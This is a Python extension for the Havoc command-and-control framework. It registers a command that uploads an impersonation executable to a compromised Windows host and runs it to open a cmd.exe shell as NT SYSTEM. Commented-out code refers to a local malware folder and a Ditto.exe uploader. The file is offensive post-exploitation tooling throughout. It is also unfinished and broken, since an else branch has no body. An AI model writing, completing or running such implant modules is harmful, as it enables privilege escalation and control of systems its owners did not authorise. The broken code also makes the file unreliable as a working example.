from havoc import Demon, RegisterCommand
import os
import argparse


def parse_args(params):
    parser = argparse.ArgumentParser(description='This tool implemant impersonnate in Havoc frameworks', exit_on_error=False)
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    parser_exec = subparsers.add_parser('SetExecutableFile', help='Set path to executable')
    parser_exec.add_argument('executable_path')

    parser_system = subparsers.add_parser('DemonAsSystem', help='Get shell as NT System')

    parser_passsthru = subparsers.add_parser('exec', help='Command to execute on target')

    return parser.parse_args(args=params)

##def impersonnatelaunchinmemory( demonID, *param ):
##    TaskID : str    = None
##    demon  : Demon  = None
##    packer = Packer()
##
##    impersonnate_current_dir = os.getcwd()
##    impersonnate_install_path = "/Documents/Outil/Havoc/data/extensions/Havoc-impersonnate/"
##    agent_bin = impersonnate_current_dir + impersonnate_install_path + "Havoc-impersonnate/impersonnateRS.exe"
##    demon.Command(TaskID, "upload %s" % (agent_bin))


PATHTOFILE = "C:\\ProgramData\\"
EXECUTABLEFILE = None


def impersonnate( demonID, *param ):
    global EXECUTABLEFILE
    
    demon  = Demon( demonID )
    TaskID: str = demon.ConsoleWrite(demon.CONSOLE_TASK, "test")
    
    try:
        args = parse_args(param)
    except Exception as e:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, str(e))
    
    dest_path = f"{PATHTOFILE}{demonID}.exe"

    if args.command == 'SetExecutableFile':
        EXECUTABLEFILE = args.executable_path
        demon.Command(TaskID, f'upload {EXECUTABLEFILE} {dest_path}')
    elif args.command == 'DemonAsSystem':
        if EXECUTABLEFILE is None:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Vous devez executée la commande avec l'argument SetExecutableFile + Chemin vers l'executable sur votre machine")
        else:
            demon.Command(TaskID, f"shell {dest_path} --continue-on-error --target-username syst exec --command cmd.exe --detached")
    else:
        

    # impersonnate_current_dir = os.getcwd()
    # impersonnate_install_path = "/Documents/Outil/Havoc/data/extensions/Havoc-impersonnate/"
    # agent_bin = "/home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe"
    # dest_path = f"{PATHTOFILE}{demonID}.exe"
    # demon.Command(TaskID, f'upload {agent_bin} {dest_path}')
    # demon.ConsoleWrite(demon.CONSOLE_INFO, "Upload Ditto in RoamingAPPDATA")
    # ##demon.Command(TaskID, f"shell {dest_path}")
    # demon.Command(TaskID, f"shell {dest_path} {parse_args(param)}")
    # demon.ConsoleWrite(demon.CONSOLE_INFO, param[0])

RegisterCommand(impersonnate, "", "impersonnate-uploads-run", "Uploads and run impersonnate tool on the target", 0, "", "" )
